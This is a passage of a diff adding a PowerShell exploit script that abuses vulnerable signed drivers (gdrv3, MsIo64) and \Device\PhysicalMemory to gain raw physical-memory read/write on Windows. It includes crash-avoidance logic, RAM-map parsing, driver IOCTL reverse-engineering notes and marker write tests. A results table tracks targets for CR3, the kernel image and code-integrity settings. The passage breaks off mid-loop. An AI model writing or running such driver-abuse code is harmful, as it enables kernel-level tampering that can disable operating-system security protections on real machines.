@@ -1,0 +1,235 @@
+﻿try {
+    Add-Type -Path $CS -ErrorAction Stop
+    Log '  [cs] p36_prov.cs compiled'
+} catch {
+    Log ("  [cs] COMPILE FAILED: {0}" -f $_.Exception.Message)
+    Log '  [cs] (see p36_write.txt tail; aborting)'
+    '-- p36 ABORT (compile) --' | Add-Content -LiteralPath $OUT -Encoding UTF8
+    exit 1
+}
+
+# ---- crash-learned bad-PA blacklist -----------------------------------------
+# A run that dies inside gdrv3 leaves a durable breadcrumb whose LAST line names the
+# PA that killed the box.  Fold that PA into p36_badpa.txt and skip it from now on, so
+# the scan walks past the hole instead of dying there on every single run.  Repeat:
+# each crash teaches one more hole, and the run gets further every time.
+$badPath = Join-Path $PSScriptRoot 'p36_badpa.txt'
+$prevIo  = Join-Path $PSScriptRoot 'p36_io_prev.txt'
+$bad = New-Object System.Collections.ArrayList
+if (Test-Path -LiteralPath $badPath) {
+    foreach ($ln in @(Get-Content -LiteralPath $badPath -EA 0)) {
+        if ($ln -match '^\s*[0-9a-f]+\s*-\s*[0-9a-f]+\s*$') { $bad.Add($ln.Trim()) | Out-Null }
+    }
+}
+$learned = ''
+# io breadcrumb + PREVIOUS run's io tail, kept BEFORE learning from it: the learner
+# must see the PA the LAST run died on.  (02:11 post-mortem: this copy used to run
+# AFTER the learner, so learning always saw a two-runs-stale tail - the 02:00:26 run
+# died at pa=0x800000 and nothing was ever learned from it.)
+$ioPath = Join-Path $PSScriptRoot 'p36_io.txt'
+if (Test-Path -LiteralPath $ioPath) { Copy-Item -LiteralPath $ioPath -Destination $prevIo -Force -EA 0 }
+if ((Test-Path -LiteralPath $prevIo) -and (Test-Path -LiteralPath $prevOut)) {
+    # END/ABORT comes from the PREVIOUS run's log (saved above, before $OUT was
+    # reset) - never from $OUT itself, which by now holds only this run's header.
+    $prevLog = (Get-Content -LiteralPath $prevOut -EA 0) -join "`n"
+    if ($prevLog -notmatch '-- p36 (END|ABORT)') {
+        $lines = @(Get-Content -LiteralPath $prevIo -EA 0)
+        for ($i = $lines.Count - 1; $i -ge 0; $i--) {
+            if ($lines[$i] -match 'read pa=0x([0-9a-f]+) size=0x([0-9a-f]+)') {
+                $kpa = [Convert]::ToUInt64($matches[1], 16)
+                # blacklist the enclosing 2 MiB, not just the 4 bytes that died:
+                # the hole is at least a page, the 02:00:26 killer 0x800000 is
+                # 2 MiB-aligned, and a 1 MiB sweep step inside the same hole
+                # would otherwise bugcheck the box one PA at a time.
+                $kp = (([uint64]$kpa) -shr 21) -shl 21
+                $learned = ('{0:x}-{1:x}' -f $kp, ($kp + 0x200000))
+                break
+            }
+        }
+    }
+}
+if (($learned -ne '') -and -not $bad.Contains($learned)) {
+    $bad.Add($learned) | Out-Null
+    (@($bad) | Select-Object -Last 64) | Set-Content -LiteralPath $badPath -Encoding ascii
+    Log ("  BADPA: previous run died, blacklisting the PA it died on: {0}" -f $learned)
+} elseif ($bad.Count -gt 0) { Log ("  BADPA: {0} previously-learned range(s) loaded" -f $bad.Count) }
+[P36Prov]::SetBadRanges(($bad -join ','))
+
+$ramTop = [P36Prov]::RamTop()
+Log ("  ramTop=0x{0:x} ({1} GB)" -f $ramTop, [math]::Round($ramTop/1GB,1))
+
+# ---- RAM truth table -------------------------------------------------------
+# gdrv3 maps a PA with NO backing-RAM validation.  "PA < ramTop" is not a RAM
+# test: on a 32 GB box the PCI/MMIO hole sits BELOW ramTop, and a hole read avs
+# gdrv3 -> bugcheck 0x3B.  Proven twice on the host (01/11 21:54, 27/10 23:50).
+$ramRanges = ''
+try {
+    $k = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('HARDWARE\RESOURCEMAP\System Resources\Physical Memory')
+    $rb = $k.GetValue('.Translated'); $k.Close()
+    if ($rb -and $rb.Length -ge 16) {
+        $off = 4; $cnt = [BitConverter]::ToUInt32($rb, 0); $parts = New-Object System.Collections.ArrayList
+        for ($l = 0; $l -lt $cnt; $l++) {
+            if ($off + 16 -gt $rb.Length) { break }
+            $off += 12; $n = [BitConverter]::ToUInt32($rb, $off); $off += 4
+            for ($d = 0; $d -lt $n; $d++) {
+                if ($off + 16 -gt $rb.Length) { break }
+                $type = $rb[$off]; $st = [BitConverter]::ToUInt64($rb, $off + 4)
+                $ln = [BitConverter]::ToUInt32($rb, $off + 12); $off += 16
+                if ($type -eq 3 -and $ln -gt 0) { $parts.Add(('{0:x}-{1:x}' -f $st, ($st + $ln))) | Out-Null }
+            }
+        }
+        $ramRanges = ($parts -join ',')
+    }
+} catch { }
+if ($ramRanges -eq '') {
+    # .NET could not read the REG_RESOURCE_LIST (GetValue -> NULL), which is exactly why
+    # this was empty on 01/11 and the hole filter silently degenerated to pa<ramTop.
+    try { $ramRanges = [P36Prov]::RamRangesFromRegistry() } catch { $ramRanges = 'native-exc: ' + $_.Exception.Message }
+    Log ("  ramRanges(native RegQueryValueEx) = {0}" -f $ramRanges)
+    if ($ramRanges -match '^(open|query|read|short|no-memory|native-exc)') { $ramRanges = '' }
+}
+if ($ramRanges -eq '') { Log '  !! RAM map EMPTY - fallback pa<ramTop + BADPA blacklist (hole PAs can still bugcheck)' }
+else { Log ("  ramRanges = {0}" -f $ramRanges) }
+[P36Prov]::SetRamRanges($ramRanges, $ramTop)
+
+# per-IOCTL breadcrumb in its own file: it must survive a bugcheck, and the scan
+# issues ~16k reads so the main log would be too slow.  (Preserving the previous
+# run's tail now happens up in the BADPA block, BEFORE learning from it.)
+Set-Content -LiteralPath $ioPath -Value ("# io breadcrumb {0}" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss')) -Encoding UTF8
+# WriteThrough again - the StreamWriter's own buffer would otherwise die with the box,
+# and this is the file whose last line is the crash's exact address.
+$ioFs = New-Object System.IO.FileStream($ioPath, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite, 4096, [System.IO.FileOptions]::WriteThrough)
+$script:ioSw = New-Object System.IO.StreamWriter($ioFs, (New-Object System.Text.UTF8Encoding($false)))
+$script:ioSw.AutoFlush = $true
+try { [P36Prov]::Notify = [P36Prov+Note] { param([string]$s) $script:ioSw.WriteLine($s) } }
+catch { Log ('  !! Notify hook failed: ' + $_.Exception.Message) }
+
+$ref0 = New-Object byte[] 32
+
+# ---- G0: the one verified read primitive ----------------------------------
+$g = [IntPtr]::Zero
+$err = [P36Prov]::GdrvOpen([ref]$g)
+if ($err -ne '') { Log ("  G0 \\.\GIOV3 FAIL {0}" -f $err) } else {
+    Log ("  G0 \\.\GIOV3 open ok handle=0x{0:x}" -f $g.ToInt64())
+    $ref0 = [P36Prov]::GdrvRead($g, [uint64]0x1000, 32)
+    Log ("  G0 read phys 0x1000 = {0}" -f ([P36Prov]::Hex($ref0)))
+    Log ("  G0 read phys 0x2000 = {0}" -f ([P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x2000, 16))))
+}
+
+$verdict = [ordered]@{ W1_physmem = $false; W2_msio = $false; W3_gdrv = $false; X_cr3 = $false; X_ntos = $false; X_ci = $false }
+$ciTargetVa = [uint64]0; $ciValue = [uint32]0
+$ntPhys = [uint64]0; $ntSize = [uint32]0; $cr3 = [uint64]0; $ntVa = [uint64]0
+# ---- W1: \Device\PhysicalMemory --------------------------------------------
+Log ''
+Log '########## W1 \Device\PhysicalMemory (native, elevated, SeLockMemoryPrivilege) ##########'
+$sec = [IntPtr]::Zero
+foreach ($mask in [uint32]0xF001F, [uint32]0x6, [uint32]0x4, [uint32]0x2, [uint32]0x1) {
+    $pv = ''
+    Log ("  {0}   SeLockMemoryPrivilege={1}" -f ([P36Prov]::PhysMemOpenMask($mask, [ref]$sec, [ref]$pv)), $pv)
+    if ($sec -ne [IntPtr]::Zero) { Log '  (opened - proceeding with the marker test on this handle)' ; break }
+}
+if ($sec -ne [IntPtr]::Zero) {
+    $view = [IntPtr]::Zero; $vs = [int64]0
+    $e = [P36Prov]::PhysMemMap($sec, [uint64]0x1000, 0x1000, $false, [ref]$view, [ref]$vs)
+    if ($e -eq '') {
+        $vva = [uint64]$view.ToInt64()
+        Log ("  map pa=0x1000 -> view=0x{0:x} viewSize=0x{1:x}" -f $vva, $vs)
+        $a = [P36Prov]::ReadAt($vva, 16)
+        $b = [P36Prov]::Hex($ref0[0..15])
+        Log ("  view[0:16] = {0}" -f $a)
+        Log ("  gdrv[0:16] = {0}" -f $b)
+        $readOk = ($a -ne $null -and $a -eq $b)
+        Log ("  W1 read-coherent = {0}" -f $readOk)
+        $orig = [P36Prov]::ReadAt(($vva + 0x10), 8)
+        $wr = [P36Prov]::WriteAt(($vva + 0x10), $MARK)
+        $viaGdrv = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1010, 8))
+        $markHex = [P36Prov]::Hex($MARK)
+        [P36Prov]::WriteAt(($vva + 0x10), [byte[]]($orig -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
+        $restored = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1010, 8))
+        Log ("  marker orig={0} wrote={1} via_gdrv={2} restored={3}" -f $orig, $markHex, $viaGdrv, $restored)
+        $writeOk = ($viaGdrv -eq $markHex) -and ($restored -eq $orig)
+        Log ("  W1 write-coherent+restored = {0}" -f $writeOk)
+        $t0 = Get-Date
+        for ($i = 0; $i -lt 200; $i++) { [P36Prov]::WriteAt(($vva + 0x10), $MARK) | Out-Null }
+        [P36Prov]::WriteAt(($vva + 0x10), [byte[]]($orig -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
+        Log ("  W1 200 view writes = {0:N0} ms ({1:N0} us/op)" -f ((Get-Date) - $t0).TotalMilliseconds, (((Get-Date) - $t0).TotalMilliseconds * 1000 / 200))
+        $verdict.W1_physmem = ($readOk -and $writeOk)
+        if ($verdict.W1_physmem) { Log '  W1 PASS - native physical R/W view held open' }
+        else { Log ("  W1 FAIL - unmap={0}" -f ([P36Prov]::PhysMemUnmap($sec, $view))) }
+    } else { Log ("  map FAIL: {0}" -f $e) }
+} else { Log '  W1 no section handle' }
+
+# ---- W2: MsIo64 map ------------------------------------------------------
+Log ''
+Log '########## W2 MsIo64 0x80102040 (fallback driver-mediated view) ##########'
+$mio = [IntPtr]::Zero
+$me2 = [P36Prov]::MsIoOpen([ref]$mio)
+if ($me2 -ne '') { Log ("  open \\.\MSIO FAIL {0}" -f $me2) } else {
+    Log ("  open \\.\MSIO ok handle=0x{0:x}" -f $mio.ToInt64())
+    $ref4 = [P36Prov]::Hex($ref0[0..15])
+    foreach ($shape in 0,1,2,3) {
+        $err2 = [uint32]0; $oh = ''
+        $st = [P36Prov]::MsIoTry($mio, $shape, [uint64]0x1000, 0x1000, [ref]$err2, [ref]$oh)
+        Log ("  {0}" -f $st)
+        if ($st -match ' OK') {
+            Log ("    out={0}" -f $oh)
+            $q = $oh -split ' '
+            for ($k = 0; $k -lt 8; $k++) {
+                $v = [uint64]::Parse(($q[($k*8)..($k*8+7)] -join ''), 'HexNumber')
+                if ([P36Prov]::IsUserVa($v)) {
+                    $sample = [P36Prov]::ReadAt($v, 16)
+                    Log ("    q[{0}]=0x{1:x} deref={2} match={3}" -f $k, $v, $sample, ($sample -eq $ref4))
+                    if ($sample -eq $ref4 -and -not $verdict.W2_msio) {
+                        $verdict.W2_msio = $true
+                        Log ("    W2 PASS - user view at 0x{0:x} maps pa=0x1000; marker test:" -f $v)
+                        $o2 = [P36Prov]::ReadAt($v, 8)
+                        [P36Prov]::WriteAt($v, $MARK) | Out-Null
+                        $back = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
+                        [P36Prov]::WriteAt($v, [byte[]]($o2 -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
+                        $res = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
+                        Log ("    orig={0} wrote={1} via_gdrv={2} restored={3}" -f $o2, ([P36Prov]::Hex($MARK)), $back, $res)
+                        if ($back -ne ([P36Prov]::Hex($MARK)) -or $res -ne $o2) { $verdict.W2_msio = $false; Log '    W2 marker NOT coherent' }
+                    }
+                }
+            }
+        }
+        if ($verdict.W2_msio) { break }
+    }
+    # REVISED-2 shape, from the full worker-0x1090 RE (temp\drv\annot_MsIo64.txt):
+    #   in = { q0 = len (driver caps at 4), q1 = user VA whose low32 == the PA to map,
+    #          q2/q3/q4 = 0 in -> section handle / view base in OUR process / object out }.
+    #   The driver opens \Device\PhysicalMemory KERNEL-side (Zw, PreviousMode=kernel),
+    #   so the usermode DACL that kills W1 does not apply; the view lands in our own
+    #   process at SectionOffset=low32(q1), ViewSize=min(q0,4), RW+NOCACHE.
+    #   Worker 0x10aa range-checks low32(q1) in [G, G+0x10000000) of a driver global
+    #   (unknown statically) -> outside = err 5.  Sweep PAs; the OK-vs-err5 pattern
+    #   reveals the window, and in-window RAM PAs get the full marker test.
+    foreach ($pa in [uint64]0x20000, [uint64]0x100000, [uint64]0x200000, [uint64]0x800000,
+                        [uint64]0x2000000, [uint64]0x8000000, [uint64]0x10000000, [uint64]0x18000000,
+                        [uint64]0x20000000, [uint64]0x30000000, [uint64]0x38000000, [uint64]0x40000000,
+                        [uint64]0x60000000, [uint64]0x80000000, [uint64]0xA0000000, [uint64]0xC0000000,
+                        [uint64]0xE0000000, [uint64]0xF0000000) {
+        # 02:11 post-mortem: the 02:00:26 run logged ZERO try3 lines although this loop
+        # is unconditional - something threw before the first Log and the whole foreach
+        # was silently skipped.  Catch per-PA so one bad call neither eats the loop
+        # nor stays invisible: the exception text lands in p36_write.txt.
+        try {
+        $e5 = [uint32]0; $vb = [uint64]0; $o2h = [uint64]0; $o4o = [uint64]0
+        $st3 = [P36Prov]::MsIoMapTry3($mio, $pa, 4, [ref]$e5, [ref]$vb, [ref]$o2h, [ref]$o4o)
+        Log ("  try3 {0}  view=0x{1:x} h=0x{2:x} obj=0x{3:x}" -f $st3, $vb, $o2h, $o4o)
+        if ($vb -ne 0 -and [P36Prov]::InRam($pa)) {
+            $gref = [P36Prov]::Hex([P36Prov]::GdrvRead($g, $pa, 4))
+            $vs   = [P36Prov]::ReadAt($vb, 4)
+            Log ("    view[0:4]={0} gdrv[0:4]={1} match={2}" -f $vs, $gref, ($vs -eq $gref))
+            if ($vs -eq $gref) {
+                $m4 = [byte[]]($MARK[0..3]); $mh = [P36Prov]::Hex($m4)
+                $o2 = $vs
+                [P36Prov]::WriteAt($vb, $m4) | Out-Null
+                $bk = [P36Prov]::Hex([P36Prov]::GdrvRead($g, $pa, 4))
+                [byte[]]$orig = ($o2 -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })
+                [P36Prov]::WriteAt($vb, $orig) | Out-Null
+                $rs = [P36Prov]::Hex([P36Prov]::GdrvRead($g, $pa, 4))
+                Log ("    marker orig={0} wrote={1} via_gdrv={2} restored={3}" -f $o2, $mh, $bk, $rs)
+                if ($bk -eq $mh -and $rs -eq $o2) {
+                    $verdict.W2_msio = $true
+                    Log ("    W2 PASS - MsIo view maps pa=0x{0:x} (G-window covers it)" -f $pa)
